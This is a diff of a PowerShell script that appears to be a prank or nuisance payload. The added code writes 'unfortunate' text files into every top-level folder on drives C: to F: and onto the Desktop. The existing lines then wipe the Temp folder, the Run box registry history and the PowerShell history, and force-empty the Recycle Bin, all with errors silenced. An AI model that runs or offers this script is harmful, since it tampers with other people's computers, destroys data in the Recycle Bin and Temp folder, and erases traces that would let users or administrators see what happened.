@@ -30,18 +30,30 @@ for ($i=0; $i -lt 300; $i++)
     }
 }
 
-# Delete contents of Temp folder 
+# Get the list of available folders
+$folders = [System.IO.Directory]::GetDirectories("C:\")
+$folders += [System.IO.Directory]::GetDirectories("D:\")
+$folders += [System.IO.Directory]::GetDirectories("E:\")
+$folders += [System.IO.Directory]::GetDirectories("F:\")
+$folders += [Environment]::GetFolderPath("Desktop")
 
+# Create a text file in each folder
+$i = 1
+foreach ($folder in $folders) {
+    $fileName = "unfortunate$i.txt"
+    $path = $folder + "\" + $fileName
+    Set-Content $path -Value "This is an unfortunate text file $i."
+    $i++
+}
+
+# Delete contents of Temp folder 
 rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue
 
 # Delete run box history
-
 reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
 
 # Delete powershell history
-
 Remove-Item (Get-PSreadlineOption).HistorySavePath
 
 # Deletes contents of recycle bin
-
 Clear-RecycleBin -Force -ErrorAction SilentlyContinue
